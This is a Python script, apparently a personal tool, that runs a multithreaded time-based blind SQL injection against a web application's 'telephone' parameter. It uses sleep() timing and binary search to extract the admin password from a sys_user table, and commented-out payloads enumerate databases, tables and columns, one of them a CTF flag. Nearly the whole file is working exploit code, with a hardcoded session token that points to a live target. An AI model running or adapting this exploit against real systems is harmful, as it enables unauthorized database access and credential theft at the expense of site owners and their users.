#sql injection v2.py
# -*- coding: UTF-8 -*-
import threading
import requests
import random
import datetime


headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
}

proxies = {"http":None,"https":None}

user_agent = [
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"
]

class MyThread(threading.Thread):
    def __init__(self, func, args):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args
    def getresult(self):
        return self.res
    def run(self):
        self.res = self.func(*self.args)

def payload(i,j):
    global url

    # sql = "(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)"%(i,j)                                #数据库名字          
    # sql = "(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='d3ctf'),%d,1))>%d)#"%(i,j)           #表名
    # sql = "(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='vs_records')),%d,1))>%d)#"%(i,j)        #列名
    # sql = "(ord(substr((select(group_concat(flag))from('v_idbcfgitlfeAg_hkbft_mh\f<v_Avart_ttkeImdVt`qtjle')),%d,1))>%d)#"%(i,j)
    # sql="(ord(mid(database(),%d,1))>%d)"%(i,j)
    #print(i)
    # header = {'User-Agent': user_agent[random.randint(0,7)]}

    # sql="1'+and(select*from(select+if((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='qylink'),%d,1))>%d),sleep(3),0))a)='"%(i,j)

    # sql="1'+and(select*from(select+if((ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='sys_user')),%d,1))>%d),sleep(3),0))a)='"%(i,j)

    sql="1'+and(select*from(select+if((ord(substr((select(group_concat(password))from(sys_user)where(username='admin')),%d,1))>%d),sleep(3),0))a)='"%(i,j)

    # sql="1'+and(select*from(select+if((ord(substr((SELECT(group_concat(TABLE_NAME))FROM(information_schema.columns)WHERE(column_name='username'+AND+TABLE_SCHEMA='qylink')),%d,1))>%d),sleep(3),0))a)='"%(i,j)

    sql_url =url+"?_search=false&nd=1649601296218&rows=50&page=1&sidx=caller&sord=asc&groupId=&telephone="+sql+"&startTime=2022-04-04&endTime=2022-04-10&__RequestVerificationToken=CfDJ8B8euUqfnv1BggVa9QlMexZpLivepUzU93j85XfWrCbz3psI6WT2aLVLrULud1ANmYofTa927fttZjMi2AXrp0bW4OKxiDTPotM_8w5xSrRgUYYaadhOuH-aCyDoEuqjTWLQ0OO3zawzdWBSQ56ikDxx8tGQRXsDN3dS62hgSmwGVn0C5BHHNC7R-0mffE7GPw"
    time1 = datetime.datetime.now()
    r = requests.get(sql_url,headers=headers,proxies=proxies)
    # print (r.text)
    time2 = datetime.datetime.now()
    sec = (time2 - time1).seconds
    if sec > 2 :
        res = 1
    else:
        res = 0
 
    return res
 
def exp(a,i):
    lock = threading.Lock()
    low = 31
    high = 127
    lock.acquire()
    while low <= high :
        mid = (low + high) // 2
        o=a+i
        #print(o)
        res = payload(o,mid)
        if res :
            low = mid + 1
        else :
            high = mid - 1
    asci = int((low + high + 1)) // 2
    if (asci == 127 or asci == 31):
        return 0
    # print (asci)
    return chr(asci)
    lock.release()

def main():
    global flag
    a=1
    f=True

    thread_num=15

    while f:
        threads = []
        for i in range(thread_num):
            t = MyThread(exp, (a,i))
            threads.append(t)

        for i in range(thread_num):
            threads[i].start()

        for i in range(thread_num):
            threads[i].join()
            if threads[i].getresult()==0:
                f = False
                break
            else:
                flag = flag + str(threads[i].getresult())

        a = a+thread_num
        print(flag+"\n")

if __name__ == '__main__':
    flag = ""
    url=""#目标url
    main()
